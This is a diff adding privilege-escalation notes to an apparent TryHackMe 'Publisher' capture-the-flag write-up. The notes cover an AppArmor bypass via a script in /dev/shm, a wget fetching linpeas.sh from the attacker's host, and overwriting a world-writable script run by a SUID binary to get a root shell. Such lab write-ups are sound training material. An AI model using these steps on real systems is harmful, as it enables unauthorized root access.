@@ -110,6 +110,107 @@ b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 ┌──(duke㉿kali)-[~/Documents/THM_Publisher]
 └─$ ssh -i think think@publisher.thm
 
+## Privilege Escalation - Shell Weirdness - can't write to /TMP, cant read /opt
+
+think@publisher:/etc/apparmor.d$ aa-enabled 
+Yes
+think@publisher:/etc/apparmor.d$ cat usr.sbin.ash 
+#include <tunables/global>
+
+/usr/sbin/ash flags=(complain) {
+  #include <abstractions/base>
+  #include <abstractions/bash>
+  #include <abstractions/consoles>
+  #include <abstractions/nameservice>
+  #include <abstractions/user-tmp>
+
+  # Remove specific file path rules
+  # Deny access to certain directories
+  deny /opt/ r,
+  deny /opt/** w,
+  deny /tmp/** w,
+  deny /dev/shm w,
+  deny /var/tmp w,
+  deny /home/** w,
+  /usr/bin/** mrix,
+  /usr/sbin/** mrix,
+
+  # Simplified rule for accessing /home directory
+  owner /home/** rix,
+}
+
+## AppArmor Bypass
+
+think@publisher:/etc/apparmor.d$ echo -e '#! /bin/bash\n/bin/bash -ip' > /dev/shm/pwn.sh
+think@publisher:/etc/apparmor.d$ chmod 755 /dev/shm/pwn.sh
+think@publisher:/etc/apparmor.d$ cat /dev/shm/pwn.sh 
+#! /bin/bash
+/bin/bash -ip
+think@publisher:/etc/apparmor.d$ /dev/shm/pwn.sh 
+### get normal shell
+think@publisher:/etc/apparmor.d$ ls -l /opt/
+total 12
+drwx--x--x 4 root root 4096 Nov 14  2023 containerd
+-rw-r--r-- 1 root root  861 Dec  7  2023 dockerfile
+-rwxrwxrwx 1 root root 1715 Jan 10  2024 run_container.sh
+think@publisher:/etc/apparmor.d$ cd ..
+think@publisher:/etc$ cd ..
+think@publisher:/$ cd tmp
+think@publisher:/tmp$ wget http://10.9.30.202/linpeas.sh
+--2024-08-12 09:53:15--  http://10.9.30.202/linpeas.sh
+Connecting to 10.9.30.202:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 847834 (828K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                   100%[==============================================>] 827.96K  3.06MB/s    in 0.3s    
+
+2024-08-12 09:53:15 (3.06 MB/s) - ‘linpeas.sh’ saved [847834/847834]
+
+### Privilage Escalation
+
+╔══════════╣ SGID
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                    
+-rwxr-sr-x 1 root mail 23K Apr  7  2021 /usr/libexec/camel-lock-helper-1.2                                          
+-rwxr-sr-x 1 root utmp 15K Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
+-rwsr-sr-x 1 root root 15K Dec 13  2023 /usr/lib/xorg/Xorg.wrap
+-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /usr/sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /usr/sbin/unix_chkpwd
+###  -rwsr-sr-x 1 root root 17K Nov 14  2023 /usr/sbin/run_container (Unknown SGID binary)
+
+
+think@publisher:/usr/sbin$ strings run_container 
+__cxa_finalize
+__libc_start_main
+GLIBC_2.2.5
+GLIBC_2.4
+u+UH
+[]A\A]A^A_
+/bin/bash
+/opt/run_container.sh
+:*3$"
+GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
+crtstuff.c
+think@publisher:/usr/sbin$ cd /opt
+think@publisher:/opt$ ls -la
+total 20
+drwxr-xr-x  3 root root 4096 Jan 10  2024 .
+drwxr-xr-x 18 root root 4096 Nov 14  2023 ..
+drwx--x--x  4 root root 4096 Nov 14  2023 containerd
+-rw-r--r--  1 root root  861 Dec  7  2023 dockerfile
+-rwxrwxrwx  1 root root 1715 Jan 10  2024 run_container.sh
+think@publisher:/opt$ cat run_container.sh 
+#!/bin/bash
+...
+think@publisher:/opt$ echo -e '#! /bin/bash\n/bin/bash -ip' > /opt/run_container.sh
+think@publisher:/opt$ cat run_container.sh 
+#! /bin/bash
+/bin/bash -ip
+think@publisher:/opt$ /usr/sbin/run_container 
+bash-5.0# whoami
+root
+
+
 
 
 
